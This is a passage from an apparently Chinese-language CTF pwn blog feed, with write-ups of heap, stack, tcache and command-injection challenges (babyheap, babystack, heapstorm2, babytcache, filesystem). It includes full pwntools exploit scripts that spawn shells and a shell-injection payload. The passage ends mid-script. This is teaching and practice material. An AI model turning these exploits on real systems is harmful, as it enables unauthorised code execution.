    <content type="html"><![CDATA[<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>整体代码风格与2017 的babyheap基本一致，不过漏洞点变得隐蔽且利用变得困难了</p><p>功能： allocate, resize, show, delete 四个功能</p><p>指针仍然是通过一通操作被隐蔽了，所以不能打存放指针地址的主意</p><p>allocate时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> size = read_int_8();</span><br><span class="line"> if ( size &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( size &gt; 0x58 )</span><br><span class="line">     size = 0x58;</span><br></pre></td></tr></table></figure></p><p>而resize时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> LODWORD(v1) = read_int_8();</span><br><span class="line"> newsize = v1;</span><br><span class="line"> if ( (signed int)v1 &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   v1 = *(_QWORD *)(24LL * idx + a1 + 8) + 1LL;  // new size+1</span><br><span class="line">   if ( newsize &lt;= v1 )</span><br></pre></td></tr></table></figure></p><p>存在off-by-one漏洞，其他函数基本没有问题</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用off-by-one，修改chunk size，释放chunk，再申请，将未释放的chunk被系统标记为释放，以此泄露libc</p><p>之后的思路便是复写malloc_hook ，但是这里需要注意一点：</p><p>申请的chunk最终大小最大为0x60，也就是即使千辛万苦将某个chunk的size改为0x70并将其置入链表，也没有任何用，尝试了好久之前却没动脑子，哭了；</p><p>所以需要换个思路，可以使用之前三级头招新时出题人的思路：将size放入fastbinY中，然后将chunk分配到main_arena处，修改topchunk为malloc_hook之上，然后再次分配chunk复写malloc_hook即可</p><p>这里就没有必要想free_hook了，毕竟free_hook周围全都是’\x00’，topchunk地址改过去，分配时size检查就没法过了</p><p>这种不能查看指针的，需要搞清楚自己申请的释放的都是哪些chunk，不然很容易乱。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def resize(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x18) #0</span><br><span class="line">allocate(0x28) #1</span><br><span class="line">allocate(0x58) #2</span><br><span class="line">allocate(0x18) #3</span><br><span class="line">allocate(0x38) #4</span><br><span class="line"></span><br><span class="line">#---------leak libc addr-------------------------</span><br><span class="line">resize(0,0x19,&apos;a&apos;*0x18+p8(0x91))</span><br><span class="line">delete(1)</span><br><span class="line">allocate(0x28)</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print &apos;leak_addr: &apos;+hex(leak_addr)</span><br><span class="line">main_arena = leak_addr- 88</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">libc_addr = main_arena - 0x3c4b20</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0x4526a </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----------get shell-----------------------------</span><br><span class="line">allocate(0x58) #5</span><br><span class="line">delete(5)</span><br><span class="line">resize(2,0x8,p64(0x41))</span><br><span class="line">allocate(0x58) #5</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#allocate(0x18) #6</span><br><span class="line">#allocate(0x58) #7</span><br><span class="line"></span><br><span class="line">resize(5,0x59,&apos;a&apos;*0x58+p8(0x61))</span><br><span class="line">#resize(4,0x10,&apos;a&apos;*0x38+p64(0x41))</span><br><span class="line">delete(3)</span><br><span class="line">allocate(0x58)</span><br><span class="line">resize(3,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">resize(3,0x28,&apos;c&apos;*0x18+p64(0x41)+p64(main_arena+0x20))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line"></span><br><span class="line">resize(6,0x30,&apos;a&apos;*0x28+p64(main_arena-0x20))</span><br><span class="line">allocate(0x10)</span><br><span class="line">resize(7,0x8,p64(one_gadget))</span><br><span class="line">allocate(0x10)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>ret2_resolve_runtime ， 直接给了溢出，但是无处下手，实际就是ret2resolve 的标准情况，这里也学习一下</p><p><a href="https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read__()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x40u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>溢出在bss段伪造resolve结构体，覆盖write为system调用’/bin/sh’ getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048300</span><br><span class="line">bss = 0x0804a020</span><br><span class="line">vulFunc = 0x0804843B</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babystack&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./babystack&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;A&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;A&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="heapstorm2"><a href="#heapstorm2" class="headerlink" title="heapstorm2"></a>heapstorm2</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>刚开始进行了一通设置，这里需要关注一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 setup()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;    __ __ _____________   __   __    ___    ____\n&quot;</span><br><span class="line">    &quot;   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n&quot;</span><br><span class="line">    &quot;  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n&quot;</span><br><span class="line">    &quot; / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n&quot;</span><br><span class="line">    &quot;/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n&quot;);</span><br><span class="line">  puts(&quot;===== HEAP STORM II =====&quot;);</span><br><span class="line">  if ( !mallopt(1, 0) )                         // ban fastbin</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd &lt; 0 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  close(fd);</span><br><span class="line">  MEMORY[0x13370818] = MEMORY[0x13370810];</span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = set_ptr((_QWORD *)0x13370800, 0LL);</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = set_size(0x13370800LL, 0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0x13370800LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以注意到</p><ol><li>使用mallopt取消了fastbin，</li><li>在0x1337000 处 分配了0x1000大小的空间，可读可写，然后从0x13370800处 写入了0x20的随机数据，后面是存储结构，指针＋size</li></ol><p>可以在调试时看这块区域的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x/20gx 0x13370800</span><br><span class="line">0x13370800:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370810:0x994db09e4d7847740x994db09e4d784774   --》  view 需要检验的地方</span><br><span class="line"></span><br><span class="line">0x13370820:0xa16b2fa20decaa860xaf69f4118a3bb75d</span><br><span class="line">0x13370830:0xa16b2fa20decaaa60xaf69f4118a3bb75d</span><br><span class="line">0x13370840:0xa16b2fa20decaac60xaf69f4118a3bb75d</span><br><span class="line">0x13370850:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370860:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370870:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370880:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370890:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br></pre></td></tr></table></figure><p>后面会将指针，size经过处理存储到这里，指针会与0x13370800处的随机数xor，size会与0x13370808处的随机数xor</p><p>主功能有 </p><ol><li>alloc ， 使用了calloc ，最多16个chunk且会将输入的chunk 的指针与size存储到上面说的地方 size要大于12小于0x01000；</li><li><p>update  , 再输入的大小要不大于原size-12,输入数据后会将其最后12字节进行填充，很明显有off-by-null;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line">size_ = get_num();</span><br><span class="line">if ( size_ &lt;= 0 || size_ &gt; (unsigned __int64)(set_size((__int64)a1, a1[idx + 2].size) - 12) )</span><br><span class="line">  return puts(&quot;Invalid Size&quot;);</span><br><span class="line">printf(&quot;Content: &quot;);</span><br><span class="line">v2 = set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">get_str(v2, size_);</span><br><span class="line">v3 = size_ + v2;</span><br><span class="line">*(_QWORD *)v3 = &apos;ROTSPAEH&apos;;</span><br><span class="line">*(_DWORD *)(v3 + 8) = &apos;II_M&apos;;</span><br><span class="line">*(_BYTE *)(v3 + 12) = 0;                      // off-by-null</span><br><span class="line">return printf(&quot;Chunk %d Updated\n&quot;, (unsigned int)idx);</span><br></pre></td></tr></table></figure></li><li><p>delete 检查存储的size，之后删除, 可以看到处理的比较干净；</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( idx &lt; 0 || idx &gt; 15 || !set_size((__int64)a1, a1[idx + 2].size) )</span><br><span class="line">  return puts(&quot;Invalid Index&quot;);</span><br><span class="line">v2 = (void *)set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">free(v2);</span><br><span class="line">a1[idx + 2LL].ptr = set_ptr(a1, 0LL);</span><br><span class="line">a1[idx + 2].size = set_size((__int64)a1, 0LL);</span><br></pre></td></tr></table></figure><ol start="4"><li>view 会检查之前的0x10处的随机数，满足条件才可以view；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( (a1[3] ^ a1[2]) != 0x13377331LL )</span><br><span class="line">  return puts(&quot;Permission denied&quot;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路还是比较清晰的，首先利用off-by-null的漏洞通过chunk overlapping 将chunk分配到0x13370800处，修改原先存储的随机数，使得可以使用view函数，同时覆盖下面存储的指针与size，调用view泄露libc基址，再将指针指向malloc_hook处或free_hook处直接getshell；</p><p>主要的问题就是利用overlapping做到条件地址写，过程应该会较为复杂；</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.9-tcache_exploit</title>
    <link href="http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/"/>
    <id>http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/</id>
    <published>2019-03-02T06:02:54.000Z</published>
    <updated>2019-03-02T07:25:12.250Z</updated>
    
    <content type="html"><![CDATA[<p><em>为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。</em></p><h1 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h1><p>glibc 在2.26之后加入了tcache机制，之前仅仅大略看了下原理，基本没什么保护，这次h4lo大佬给的是tcache的题目，顺便来练练手，因为保护比fastbin还少，所以利用起来也比较简单。</p><p>简单来说，tcache相当于插队插在了fastbin 及 smallbin 前面，内部chunk大小不排序，且最多7个，malloc时优先在里面找，free时优先进入tcache，大小都要小于0x408，当然还有一些其他的机制就不多说了</p><h1 id="babytcache"><a href="#babytcache" class="headerlink" title="babytcache"></a>babytcache</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>三个功能 add delete show</p><p>add 最多九个chunk，固定malloc(0x50)，指针存放在bss段<br>delete 检查idx范围，之后仅仅free<br>show puts指针内容</p><p>保护：开了NX 及 Canary，No pie,got表可写</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看上去就是个tcache的练手题目，也基本没有检查</p><p>2.27版本的 tcache 甚至没有double free检查，也就是说，现在可以在没有其他chunk的情况下free一个chunk多次进入tcache</p><p>所以我们的思路很清晰– double free进入bss段，改变指针泄露libc地址</p><p>得到libc地址之后复写got表，getshell. (复写free不成功，不太清楚为什么，复写puts没问题)</p><ul><li>需要注意的是，tcache中有一个计数的tc_idx，也就是如果采用double free，会造成尝试分配到heap以外的时候，已经是第三次从tcache中取出chunk，而我们之前仅仅往里面放入了两个chunk，这样计数的tc_idx就会变成-1，结果便是我们可能之后无法再次使用tcache，此时free会略过tcache，malloc查询tcache时便会报错。</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babytcache&apos;)</span><br><span class="line">elf = ELF(&apos;./babytcache&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(con):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;content:&apos;,con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x6020e0+8))</span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line">add(p64(elf.got[&apos;free&apos;]))        //保证搞完后tcache没有被破坏</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;free_addr: &apos;+hex(free_addr)</span><br><span class="line">system_addr = free_addr - libc.symbols[&apos;free&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">add(&apos;/bin/sh&apos;)</span><br><span class="line">add(p64(system_addr))          //这个时候tcache已经坏了，但是不影响我们</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Tcache&quot;&gt;&lt;a href=&quot;#Tcache&quot; clas
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2019.2安恒月赛pwn</title>
    <link href="http://siriuswhiter.tk/2019/02/26/2019-2%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bpwn/"/>
    <id>http://siriuswhiter.tk/2019/02/26/2019-2安恒月赛pwn/</id>
    <published>2019-02-26T14:00:41.000Z</published>
    <updated>2019-02-27T08:14:00.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>重点函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall checksec(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-98h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x80uLL);</span><br><span class="line">  printf(&quot;Input the Index:&quot;, a2, &amp;s);</span><br><span class="line">  v3 = get_num();</span><br><span class="line">  if ( cnt &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    snprintf(&amp;s, 0x80uLL, &quot;echo \&quot;%s\&quot;| md5sum&quot;, (char *)&amp;ptr + 0x90 * v3 + 0x30);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No Such Index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给了几个函数，看了下没什么用，其中包括一个后门函数，但是限制两个字节且不能是sh，尝试vi提示没有安装，没有办法<br>checksec这边会执行几个指令，想办法绕过就好了，像web题一样</p><p>echo “” ; /bin/sh ; “”| md5sum  </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./filesystem&apos;)</span><br><span class="line">#sh = remote(&apos;101.71.29.5&apos;, 10017)</span><br><span class="line">print sh.recvuntil(&apos;&gt; 